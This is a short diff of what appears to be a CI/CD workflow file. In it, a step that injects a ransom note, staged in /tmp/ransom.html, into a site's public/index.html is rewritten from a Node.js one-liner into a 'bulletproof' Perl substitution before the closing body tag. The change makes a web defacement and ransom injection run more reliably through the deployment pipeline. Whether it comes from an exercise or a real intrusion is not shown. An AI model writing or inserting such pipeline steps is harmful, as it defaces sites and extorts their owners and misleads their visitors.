@@ -115,16 +115,8 @@ jobs:
             </script>
             RANSOM
             
-            # Find Node.js (installed via NVM) and execute the injection script
-            export NVM_DIR="$HOME/.nvm"
-            set +e
-            set +o pipefail
-            [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" || true  # This loads nvm
-            set -e
-            set -o pipefail
-            
-            # The ubuntu user owns the file, so we don't need sudo for node.
-            node -e "const fs = require('fs'); let data = fs.readFileSync('public/index.html', 'utf8'); const ransom = fs.readFileSync('/tmp/ransom.html', 'utf8'); data = data.replace('</body>', ransom + '\n  </body>'); fs.writeFileSync('public/index.html', data);" || true
+            # Bulletproof HTML injection using Perl to replace the closing body tag
+            perl -i -pe 's|<\/body>|`cat /tmp/ransom.html` . "\n</body>"|e' public/index.html || true
             
             sudo rm /tmp/ransom.html
             
